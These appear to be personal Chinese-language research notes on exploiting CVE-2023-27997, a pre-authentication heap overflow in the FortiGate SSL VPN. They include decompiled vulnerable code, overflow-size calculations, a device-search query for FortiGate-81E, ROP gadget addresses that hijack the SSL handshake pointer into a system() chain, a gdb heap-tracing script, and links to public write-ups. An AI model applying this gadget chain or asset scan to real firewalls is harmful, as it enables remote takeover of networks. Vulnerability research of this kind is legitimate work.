# 漏洞原理

```c
int parse_enc_data(char *in)
{
    int in_len = strlen(in);
    int given_len;
    int xored_given_len;

    if(in_len & 1)
    {
        return 1;
    }

    compute_key_zero(salt, in, 8, md5); // [1] Computes key from salt, seed

    out = alloc_block(*pool, (in_len >> 1) + 1); // [2] Allocate a buffer
    unhex(out, in); // [2] Hexa-decode in to out

    if (out[0]) // first byte of seed must be 0x00
    {
        ap_log_rerror((__int64)a1, 8LL, (__int64)"invalid encoding method %d\n", needs_null);
        return 1;
    }

    // [3] Decrypt given length
    xored_given_len = *((_WORD *)out + 2);
    given_len = (unsigned __int8)(xored_given_len ^ md5[0]);
    BYTE1(given_len) = md5[1] ^ HIBYTE(xored_given_len);

    if ( in_len - 5 <= given_len ) // [4] Verify bounds
    {
        ap_log_rerror(a1, 8LL, "invalid enc data length: %d\n", given_len);
        return 1LL;
    }

    // [5] Decrypt: xor every input from byte 6 (4 bytes for seed, 2 bytes for length)
    p = &out[6];
    if (given_len)
    {
        int i = 0LL;
        while (i < given_len)
        {
            if ((i + 2) % 16 == 0) // Current state is exhausted: compute new
            {
                MD5_Init(md5_ctx);
                MD5_Update(md5_ctx, md5, 16LL);
                MD5_Final(md5, md5_ctx);
            }
            p[i] ^= md5[(i + 2) % 16];
            ++i;
        }
    }
    out[6 + given_len] = 0; // [6] Append null byte

    add_kvp_to_hashmap(a1->params, out); // [7] Process plaintext

    // Allocated buffers get freed at the end of the HTTP exchange
    return 0;
}
```

```
8个字节    in_len: 16    out_buf_size:9     (in_len - 5):11     given_len max:10        溢出1字节
32个字节   in_len: 64    out_buf_size:33    (in_len - 5):59     given_len max:58				 溢出25字节
64个字节   in_len: 128   out_buf_size:65    (in_len - 5):123    given_len max:122  		 溢出57字节
```

```python
#!/bin/python3

in_len = 32

while in_len <= 1024:
    out_buf_len = (in_len>>1)+1
    in_len_5 = in_len - 5
    give_len_max = in_len_5 -1
    print(f"in_len:{in_len} out_buf_len:{out_buf_len} in_len - 5:{in_len_5}  give_len max:{give_len_max} overflow:{give_len_max - out_buf_len}")
    in_len += 2
```

# 资产扫描

fortigate product:"Fortinet FortiGate-81E"

# gadget

```c
struct ssl_st {
    /*
     * protocol version (one of SSL2_VERSION, SSL3_VERSION, TLS1_VERSION,
     * DTLS1_VERSION)
     */
    int version;
    /* SSLv3 */
    const SSL_METHOD *method;
    /*
     * There are 2 BIO's even though they are normally both the same.  This
     * is so data can be read and written to different handlers
     */
    /* used by SSL_read */
    BIO *rbio;
    /* used by SSL_write */
    BIO *wbio;
    /* used during session-id reuse to concatenate messages */
    BIO *bbio;
    /*
     * This holds a variable that indicates what we were doing when a 0 or -1
     * is returned.  This is needed for non-blocking IO so we know what
     * request needs re-doing when in SSL_accept or SSL_connect
     */
    int rwstate;                                /--20--/
    int (*handshake_func) (SSL *);              /--24--/
```

通过逆向/home/sysirq/Work/Fortinet/FortiGate_6_4_6_81E/rootfs/unpack/lib/libssl.so.1.1 中的SSL_do_handshake函数

```
.text:0001E39E                 LDR             R3, [R4,#0x18]
.text:0001E3A0                 MOV             R0, R4
.text:0001E3A2                 BLX             R3
```

发现 R4,R0 均指向sstruct ssl_st的开头




我们需要通过r0 ， 将栈移动到我们的控制的gadget中去，

```
ssl->handshake_func（offset:0x18）  设置为 (0x011f96fe : mov r7, r0 ; mov.w r0, #0x400 ; ldr r2, [r4] ; mov sb, r1 ; mov r8, r3 ; blx r2)
ssl->version				(offset:0x00)  设置为 (0x00921326 : mov sp, r7 ; pop.w {r4, r5, r6, r7, r8, sb, sl, fp, lr} ; add sp, #4 ; bx lr)
ssl->new_session		(offset:0x20)  设置为 (0x005712ee : sub sp, #0x1a8 ; pop {r4, pc})
```

这样，当执行ssl->handshake_func 会执行 ssl->version 进而执行 ssl->new_session。最后跳转到我们控制的栈上去



构造的ropchain的最后一部分

```
0x001cb480 : pop {pc}
0x001cb480 : pop {pc}
0x001cb480 : pop {pc}
0x001cb480 : pop {pc}
.....................
0x001cb480 : pop {pc}
0x0003649c : pop {r3, pc}
0x001cb480 : FUNC_FORK_SYSTEM
0x00037caa : add r0, sp, #0x24 ; blx r3
......................
```


# 用于跟踪分配的gdb脚本

```
set height 0
set pagination off
set disassembly-flavor intel
handle SIGPIPE nostop
# break after allocating the buffer grab the address
b *0x0173164e
commands
    silent
    set $heap_obj = $rax
    printf "buffer: %p\n", $heap_obj
    c
end
# print address of SSL objects when malloc'd
b *CRYPTO_zalloc+37 if  ( $r12 == 0x1db8 )
commands
    silent
    printf "CRYPTO_zalloc(0x%x) = %p\n", $r12, $rax
    c
end

# break in malloc helper function (used by vulnerable function)
b *0x018021d6 if (($r13>0x1c00) && ($r13<=0x2000))
commands
    silent
    set $size = $r13
    set $addr = $rax
    printf "malloc(0x%x) = %p\n", $size, $addr
    c
end

# break in je_malloc in case something calls je_malloc directly
b *je_malloc if (($rdi>0x1c00) && ($rdi <=0x2000))
commands
    silent
    printf "je_malloc(%x)\n", $rdi
    c
end
```

# 资料

XORtigate: Pre-authentication Remote Code Execution on Fortigate VPN (CVE-2023-27997)

https://blog.lexfo.fr/xortigate-cve-2023-27997.html

xortigate-cve-2023-27997

https://github.com/lexfo/xortigate-cve-2023-27997?tab=readme-ov-file

Alert: 330,000 FortiGate Firewalls Still Unpatched to CVE-2023-27997 RCE Flaw

https://thehackernews.com/2023/07/alert-330000-fortigate-firewalls-still.html

Fortinet Fortigate RCE (CVE-2023-27997) #18163

https://github.com/rapid7/metasploit-framework/issues/18163

CVE-2023-27997 Is Exploitable, and 69% of FortiGate Firewalls Are Vulnerable

https://bishopfox.com/blog/cve-2023-27997-exploitable-fortigate-vulnerable

Breaking Fortinet Firmware Encryption

https://bishopfox.com/blog/breaking-fortinet-firmware-encryption

CVE-2023-27997 Vulnerability Scanner for FortiGate Firewalls

https://bishopfox.com/blog/cve-2023-27997-vulnerability-scanner-fortigate

Building an Exploit for FortiGate Vulnerability CVE-2023-27997

https://bishopfox.com/blog/building-exploit-fortigate-vulnerability-cve-2023-27997

ssl_st Struct Reference

https://openxdas.sourceforge.net/doxygen/html/structssl__st.html